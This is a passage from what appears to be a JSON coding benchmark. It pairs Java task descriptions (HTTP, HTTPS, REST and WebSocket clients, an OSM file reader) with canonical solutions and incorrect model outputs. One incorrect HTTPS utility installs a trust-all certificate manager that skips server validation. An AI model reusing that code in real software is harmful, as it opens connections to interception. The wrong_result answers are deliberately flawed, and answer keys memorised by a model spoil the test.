validateHeader(readBytes(channel, blockStartPosition, blockSize));\n          } else {\n            LOGGER.warn(\"Unrecognized OSM PBF blob header type: {}\", headerType);\n          }\n          channel.position(blockStartPosition + blockSize);\n        }\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    @Override\n    public void close() {\n      try {\n        lazyReadChannel.close();\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    private record LazyBlock(long offset, int length, FileChannel channel) implements Block {\n\n      public Iterable<OsmElement> decodeElements() {\n        try {\n          var buffer = channel.map(FileChannel.MapMode.READ_ONLY, offset, length);\n          var result = PbfDecoder.decode(buffer);\n          ByteBufferUtil.free(buffer);\n          return result;\n        } catch (IOException e) {\n          throw new UncheckedIOException(e);\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class OsmInputFile {\n    private final Path path;\n    private final boolean lazy;\n    private FileChannel channel;\n\n    public OsmInputFile(Path path, boolean lazy) {\n        this.path = path;\n        this.lazy = lazy;\n    }\n\n    public FileChannel openChannel() throws IOException {\n        if (channel == null || !channel.isOpen() || !channel.valid()) {\n            channel = FileChannel.open(path, StandardOpenOption.READ);\n        }\n        return channel;\n    }\n\n    public int readInt(FileChannel channel) throws IOException {\n        byte[] buffer = new byte[4];\n        channel.read(buffer);\n        return (buffer[0] & 0xFF) << 24 | (buffer[1] & 0xFF) << 16 |\n               (buffer[2] & 0xFF) << 8 | (buffer[3] & 0xFF);\n    }\n\n    public byte[] readBytes(FileChannel channel, int length) throws IOException {\n        byte[] buffer = new byte[length];\n        channel.read(buffer);\n        return buffer;\n    }\n\n    public byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n        byte[] buffer = new byte[length];\n        channel.position(offset);\n        channel.read(buffer);\n        return buffer;\n    }\n\n    public BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n        byte[] headerData = readBytes(channel, 0, 4);\n        return new BlobHeader(headerData);\n    }\n\n    public class LazyReader implements OsmBlockSource {\n        public void forEachBlock(Consumer<Block> consumer) {\n            try {\n                FileChannel fc = openChannel();\n                long position = 0;\n                while (position < fc.size()) {\n                    BlobHeader header = readBlobHeader(fc);\n                    long blockOffset = header.getBlockOffset();\n                    int blockLength = header.getBlockLength();\n                    consumer.accept(new LazyBlock(blockOffset, blockLength, fc));\n                    position += blockLength;\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void close() {\n            if (channel != null) {\n                try {\n                    channel.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public record LazyBlock(long offset, int length, FileChannel channel) {\n            public Iterable<OsmElement> decodeElements() {\n                return List.of();\n            }\n        }\n    }\n\n    private static class BlobHeader {\n        private final byte[] data;\n\n        public BlobHeader(byte[] data) {\n            this.data = data;\n        }\n\n        public long getBlockOffset() {\n            return 0;\n        }\n\n        public int getBlockLength() {\n            return 0;\n        }\n    }\n}"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Implement a custom HTTP data source for streaming media that handles connection management, redirects, and error handling, specifically designed for YouTube video streaming.\n\nClass Description: YoutubeHttpDataSource is a custom HTTP data source implementation that extends BaseDataSource and implements HttpDataSource interface. It provides functionality for opening and closing HTTP connections, handling redirects, and managing input streams for media streaming.\n\nAttributes:\n\nallowCrossProtocolRedirects: boolean - Determines whether cross-protocol redirects (HTTP to HTTPS or vice versa) are allowed\nconnectTimeoutMillis: int - Connection timeout in milliseconds\nreadTimeoutMillis: int - Read timeout in milliseconds\nrequestProperties: RequestProperties - Contains HTTP request headers and properties\ndataSpec: DataSpec - Contains information about the data to be read\nconnection: HttpURLConnection - The active HTTP connection\ninputStream: InputStream - The input stream for reading data\nopened: boolean - Flag indicating whether the data source is currently open\n\nMethods:\n\nopen(DataSpec dataSpecParameter) -> long - Opens the data source for the specified DataSpec and returns the length of the data\nmakeConnection(DataSpec dataSpecToUse) -> HttpURLConnection - Creates and configures an HTTP connection, handling redirects\nopenConnection(URL url) -> HttpURLConnection - Opens a basic HTTP connection to the specified URL\nhandleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) -> URL - Handles HTTP redirects and returns the new URL\nclose() -> void - Closes the data source and releases all resources\nmaybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) -> void - Helper method to terminate input streams on specific Android versions\ncloseConnectionQuietly() -> void - Safely closes the current connection without throwing exceptions",
    "Canonical_solution": "import com.google.android.exoplayer2.C;\nimport com.google.android.exoplayer2.PlaybackException;\nimport com.google.android.exoplayer2.upstream.DataSource;\nimport com.google.android.exoplayer2.upstream.DataSpec;\nimport com.google.android.exoplayer2.upstream.HttpDataSource;\nimport com.google.android.exoplayer2.util.Util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.NoRouteToHostException;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private static final int MAX_REDIRECTS = 20;\n    private static final int HTTP_STATUS_TEMPORARY_REDIRECT = 307;\n    private static final int HTTP_STATUS_PERMANENT_REDIRECT = 308;\n    private static final long MAX_BYTES_TO_DRAIN = 2048;\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n\n    @Nullable\n    private DataSpec dataSpec;\n    @Nullable\n    private HttpURLConnection connection;\n    @Nullable\n    private InputStream inputStream;\n    private boolean opened;\n\n    @Override\n    public long open(@NonNull final DataSpec dataSpecParameter) throws HttpDataSourceException {\n        this.dataSpec = dataSpecParameter;\n        transferInitializing(dataSpecParameter);\n\n        try {\n            this.connection = makeConnection(dataSpec);\n            final HttpURLConnection httpURLConnection = this.connection;\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String responseMessage = httpURLConnection.getResponseMessage();\n\n            if (responseCode < 200 || responseCode > 299) {\n                throw new InvalidResponseCodeException(responseCode, responseMessage, null,\n                        httpURLConnection.getHeaderFields(), dataSpec, Util.EMPTY_BYTE_ARRAY);\n            }\n\n            inputStream = httpURLConnection.getInputStream();\n            opened = true;\n            transferStarted(dataSpecParameter);\n            return dataSpecParameter.length != C.LENGTH_UNSET ? dataSpecParameter.length : 0;\n        } catch (final IOException e) {\n            closeConnectionQuietly();\n            throw HttpDataSourceException.createForIOException(e, dataSpec,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @NonNull\n    private HttpURLConnection makeConnection(@NonNull final DataSpec dataSpecToUse)\n            throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        int redirectCount = 0;\n\n        while (redirectCount++ <= MAX_REDIRECTS) {\n            final HttpURLConnection httpURLConnection = openConnection(url);\n            httpURLConnection.setConnectTimeout(connectTimeoutMillis);\n            httpURLConnection.setReadTimeout(readTimeoutMillis);\n\n            for (final Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {\n                httpURLConnection.setRequestProperty(property.getKey(), property.getValue());\n            }\n\n            httpURLConnection.setInstanceFollowRedirects(false);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.connect();\n\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String location = httpURLConnection.getHeaderField(\"Location\");\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM\n                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP\n                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER\n                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT\n                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT) {\n                httpURLConnection.disconnect();\n                url = handleRedirect(url, location, dataSpecToUse);\n            } else {\n                return httpURLConnection;\n            }\n        }\n\n        throw new HttpDataSourceException(\n                new NoRouteToHostException(\"Too many redirects: \" + redirectCount),\n                dataSpecToUse,\n                PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                HttpDataSourceException.TYPE_OPEN);\n    }\n\n    private HttpURLConnection openConnection(@NonNull final URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    @NonNull\n    private URL handleRedirect(final URL originalUrl,\n                             @Nullable final String location,\n                             final DataSpec dataSpecToHandleRedirect)\n            throws HttpDataSourceException {\n        if (location == null) {\n            throw new HttpDataSourceException(\"Null location redirect\", dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n\n        try {\n            URL url = new URL(originalUrl, location);\n            String protocol = url.getProtocol();\n            if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {\n                throw new HttpDataSourceException(\"Unsupported protocol redirect: \" + protocol,\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {\n                throw new HttpDataSourceException(\n                        \"Disallowed cross-protocol redirect (\"\n                                + originalUrl.getProtocol()\n                                + \" to \"\n                                + protocol\n                                + \")\",\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            return url;\n        } catch (final MalformedURLException e) {\n            throw new HttpDataSourceException(e, dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @Override\n    public void close() throws HttpDataSourceException {\n        try {\n            if (inputStream != null) {\n                maybeTerminateInputStream(connection, C.LENGTH_UNSET);\n                try {\n                    inputStream.close();\n                } catch (final IOException e) {\n                    throw new HttpDataSourceException(e, castNonNull(dataSpec),\n                            PlaybackException.ERROR_CODE_IO_UNSPECIFIED,\n                            HttpDataSourceException.TYPE_CLOSE);\n                }\n            }\n        } finally {\n            inputStream = null;\n            closeConnectionQuietly();\n            if (opened) {\n                opened = false;\n                transferEnded();\n            }\n        }\n    }\n\n    private static void maybeTerminateInputStream(@Nullable final HttpURLConnection connection,\n                                                final long bytesRemaining) {\n        if (connection == null || Util.SDK_INT < 19 || Util.SDK_INT > 20) {\n            return;\n        }\n\n        try {\n            InputStream inputStream = connection.getInputStream();\n            String className = inputStream.getClass().getName();\n            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)\n                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\".equals(className)) {\n                Class<?> superclass = inputStream.getClass().getSuperclass();\n                Method unexpectedEndOfInput = checkNotNull(superclass).getDeclaredMethod(\"unexpectedEndOfInput\");\n                unexpectedEndOfInput.setAccessible(true);\n                unexpectedEndOfInput.invoke(inputStream);\n            }\n        } catch (final Exception e) {\n            // Ignore\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (final Exception e) {\n                // Ignore\n            }\n            connection = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n    private boolean allowCrossProtocolRedirects;\n    private int connectTimeoutMillis;\n    private int readTimeoutMillis;\n    private RequestProperties requestProperties;\n    private DataSpec dataSpec;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private boolean opened;\n\n    public YoutubeHttpDataSource() {\n        this.allowCrossProtocolRedirects = true;\n        this.connectTimeoutMillis = 10000;\n        this.readTimeoutMillis = 30000;\n    }\n\n    @Override\n    public long open(DataSpec dataSpecParameter) throws IOException {\n        this.dataSpec = dataSpecParameter;\n        HttpURLConnection connection = makeConnection(dataSpecParameter);\n        if (connection == null) {\n            throw new IOException(\"Failed to open connection\");\n        }\n        inputStream = connection.getInputStream();\n        long contentLength = connection.getContentLength();\n        opened = true;\n        return contentLength;\n    }\n\n    private HttpURLConnection makeConnection(DataSpec dataSpecToUse) throws IOException {\n        URL url = dataSpecToUse.url;\n        HttpURLConnection connection = openConnection(url);\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 300 && responseCode < 400) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location != null) {\n                URL newUrl = handleRedirect(dataSpecToUse.url, location, dataSpecToUse);\n                if (newUrl != null) {\n                    return makeConnection(new DataSpec(newUrl, dataSpecToUse.range));\n                }\n            }\n        }\n        return connection;\n    }\n\n    private HttpURLConnection openConnection(URL url) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setConnectTimeout(connectTimeoutMillis);\n        connection.setReadTimeout(readTimeoutMillis);\n        if (requestProperties != null) {\n            for (Map.Entry<String, String> entry : requestProperties.headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        return connection;\n    }\n\n    private URL handleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) {\n        try {\n            URL newUrl = new URL(location);\n            if (allowCrossProtocolRedirects || originalUrl.getProtocol().equals(newUrl.getProtocol())) {\n                return newUrl;\n            }\n        } catch (MalformedURLException e) {\n            // Invalid location, do nothing\n        }\n        return null;\n    }\n\n    @Override\n    public void close() {\n        if (opened) {\n            try {\n                if (inputStream != null) {\n                    maybeTerminateInputStream(connection, dataSpec.length);\n                    inputStream.close();\n                }\n                if (connection != null) {\n                    closeConnectionQuietly();\n                }\n            } catch (Exception e) {\n                // Ignore exceptions\n            } finally {\n                opened = false;\n            }\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        try {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    private void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {\n        // Placeholder for Android version-specific termination logic\n    }\n}"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Create a Java class that implements a RESTful client using HttpURLConnection to perform HTTP requests (GET, POST, PUT) and handle responses.\n\nClass Description: The `RestfulClient` class provides methods to execute HTTP requests (GET, POST, PUT) to a specified URL and process the responses. It handles connection setup, request parameter configuration, input/output stream management, and connection cleanup.\n\nAttributes: None\n\nMethods:\n\nMethod1: `get(String path) -> String` - Executes a GET request to the specified URL path and returns the response as a String.  \nMethod2: `post(String path, String requestBody) -> String` - Executes a POST request to the specified URL path with the provided request body and returns the response as a String.  \nMethod3: `put(String path, String requestBody) -> String` - Executes a PUT request to the specified URL path with the provided request body and returns the response as a String.  \nMethod4: `executeRequest(String method, String path, String requestBody) -> String` - Internal helper method that handles the common logic for executing HTTP requests (connection setup, request configuration, and response processing).  \nMethod5: `getVal(RestfulRequest request) -> String` - Executes a custom HTTP request based on the provided `RestfulRequest` object (containing URL, method, and parameters) and returns the response as a String.  \n\nInput:  \n- For `get`, `post`, and `put`:  \n  - `path` (String): The target URL for the HTTP request.  \n  - `requestBody` (String, optional for POST/PUT): The request payload in JSON format.  \n- For `getVal`:  \n  - `request` (RestfulRequest): An object encapsulating the request details (URL, HTTP method, and parameters).  \n\nOutput:  \n- String: The response body from the HTTP request, or `null` if an error occurs.",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\npublic class RestfulClient {\n\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody){\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(path);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=utf-8\");\n\n            if (requestBody != null) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes();\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            if (connection.getResponseCode() == 200) {\n                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String inputLine;\n                    StringBuilder response = new StringBuilder();\n                    while ((inputLine = in.readLine()) != null) {\n                        response.append(inputLine);\n                    }\n                    return response.toString();\n                }\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n    public String getVal(RestfulRequest request) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(request.getUrl());\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(request.getMethod());\n            connection.setDoInput(true);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \" application/json\");\n            byte[] content = request.getParam().getBytes();\n            connection.setRequestProperty(\"Content-Length\", content.length + \"\");\n\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.connect();\n            OutputStream out = connection.getOutputStream();\n            out.write(content);\n            out.flush();\n            out.close();\n\n            if (connection.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RestfulRequest {\n    private String url;\n    private String method;\n    private String params;\n    private String body;\n\n    public RestfulRequest(String url, String method, String params, String body) {\n        this.url = url;\n        this.method = method;\n        this.params = params;\n        this.body = body;\n    }\n\n    public String getUrl() {\n        return url;\n    }\n\n    public String getMethod() {\n        return method;\n    }\n\n    public String getParams() {\n        return params;\n    }\n\n    public String getBody() {\n        return body;\n    }\n}\n\npublic class RestfulClient {\n    public String get(String path) {\n        return executeRequest(\"GET\", path, null);\n    }\n\n    public String post(String path, String requestBody) {\n        return executeRequest(\"POST\", path, requestBody);\n    }\n\n    public String put(String path, String requestBody) {\n        return executeRequest(\"PUT\", path, requestBody);\n    }\n\n    private String executeRequest(String method, String path, String requestBody) {\n        try {\n            URL url = new URL(path);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n\n            if (\"POST\".equals(method) || \"PUT\".equals(method)) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = requestBody.getBytes(\"utf-8\");\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode != 200) {\n                return null;\n            }\n\n            try (InputStream is = connection.getInputStream()) {\n                StringBuilder sb = new StringBuilder();\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = is.read(buffer)) > 0) {\n                    sb.append(new String(buffer, 0, len));\n                }\n                return sb.toString();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public String getVal(RestfulRequest request) {\n        String fullUrl = request.getUrl();\n        if (request.getParams() != null && !request.getParams().isEmpty()) {\n            fullUrl += \"?\" + request.getParams();\n        }\n        return executeRequest(request.getMethod(), fullUrl, request.getBody());\n    }\n}"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Java utility class for making HTTPS requests using HttpURLConnection with custom SSL socket factory configuration.\n\nClass Description: HttpClientUtil is a utility class that provides methods for making HTTPS requests with custom SSL/TLS configuration. It handles both GET and POST methods, manages connection settings, and includes proper error handling and resource cleanup.\n\nAttributes: (None - this is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String method, String outputStr) -> HttpResponse - Makes an HTTPS request to the specified URL using the given HTTP method. Handles request body for POST methods and returns the server response.\n\nMethod2: httpsRequest2(String requestUrl, String method, String outputStr) -> HttpResponse - Alternative implementation that uses a different URL constructor with protocol handler, otherwise similar to httpsRequest.\n\nMethod3: createSSLSocketFactory() -> SSLSocketFactory - Private helper method that creates and configures an SSLSocketFactory with custom TrustManager for SSL/TLS connections. Throws IOException if SSL context creation fails.\n\nInput Parameters:\n- requestUrl: String - The HTTPS URL to connect to\n- method: String - HTTP method (GET/POST)\n- outputStr: String - Request body content (for POST requests)\n\nOutput:\n- Returns HttpResponse object containing the server response\n- Throws IOException for connection or SSL configuration errors",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\n\npublic class HttpClientUtil {\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(requestUrl);\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] tm = { new MyX509TrustManager() };\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\", \"SunJSSE\");\n            sslContext.init(null, tm, new java.security.SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | NoSuchProviderException e) {\n            throw new IOException(\"\u5b9e\u4f8b\u5316SSLContext\u5931\u8d25\", e);\n        } catch (KeyManagementException e) {\n            throw new IOException(\"\u521d\u59cb\u5316SSLContext\u5931\u8d25\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClientUtil {\n    public static class HttpResponse {\n        public final int statusCode;\n        public final String statusMessage;\n        public final String responseBody;\n\n        public HttpResponse(int statusCode, String statusMessage, String responseBody) {\n            this.statusCode = statusCode;\n            this.statusMessage = statusMessage;\n            this.responseBody = responseBody;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n            }\n        };\n\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, null);\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            throw new IOException(\"Failed to create SSL context\", e);\n        }\n    }\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(requestUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(method);\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setDoOutput(method.equals(\"POST\"));\n\n        if (method.equals(\"POST\")) {\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(StandardCharsets.UTF_8);\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        String responseMessage = connection.getResponseMessage();\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                response.append(line);\n            }\n            return new HttpResponse(responseCode, responseMessage, response.toString());\n        } catch (IOException e) {\n            throw new IOException(\"Error reading response\", e);\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        URL url = new URL(requestUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(method);\n        connection.setSSLSocketFactory(createSSLSocketFactory());\n        connection.setDoOutput(method.equals(\"POST\"));\n\n        if (method.equals(\"POST\")) {\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = outputStr.getBytes(StandardCharsets.UTF_8);\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        String responseMessage = connection.getResponseMessage();\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                response.append(line);\n            }\n            return new HttpResponse(responseCode, responseMessage, response.toString());\n        } catch (IOException e) {\n            throw new IOException(\"Error reading response\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a WebSocket client using Java Netty framework that can establish a connection to a WebSocket server, send and receive frames, and handle connection lifecycle events.\n\nClass Description: WebSocketTestClient is a Netty-based WebSocket client implementation that handles WebSocket connections, frame transmission, and connection management. It supports different WebSocket versions and provides callback mechanisms for frame handling.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- ch: [Channel] - Active channel representing the WebSocket connection\n- uri: [URI] - Target WebSocket server URI\n- version: [WebSocketVersion] - WebSocket protocol version to use\n- closed: [boolean] - Connection status flag\n- count: [AtomicInteger] - Counter for handler naming\n\nMethods:\n- connect(): [WebSocketTestClient] - Establishes connection to WebSocket server, performs handshake, and returns self for chaining\n- send(WebSocketFrame frame, FrameListener listener): [WebSocketTestClient] - Sends WebSocket frame and registers listener for response, returns self for chaining\n- destroy(): [void] - Gracefully closes connection and releases resources\n- destroy(boolean dirty): [void] - Closes connection with option for immediate termination\n- isActive(): [boolean] - Returns connection active status\n- isOpen(): [boolean] - Returns connection open status\n- isWritable(): [boolean] - Returns channel writable status\n\nNested Interfaces:\n- FrameListener: Callback interface for frame reception and error handling\n  - onFrame(WebSocketFrame frame): [void] - Called when frame is received\n  - onError(Throwable t): [void] - Called when error occurs\n\nNested Classes:\n- WSClientHandler: [SimpleChannelInboundHandler<Object>] - Internal handler for WebSocket handshake and frame processing\n  - handshakeFuture(): [ChannelFuture] - Returns handshake completion future\n  - handlerAdded(ChannelHandlerContext ctx): [void] - Initializes handshake promise\n  - channelActive(ChannelHandlerContext ctx): [void] - Initiates handshake\n  - channelRead0(ChannelHandlerContext ctx, Object o): [void] - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext ctx, Throwable cause): [void] - Handles channel errors",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.ReferenceCountUtil;\n\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic final class WebSocketTestClient {\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private volatile boolean closed;\n    private static final AtomicInteger count 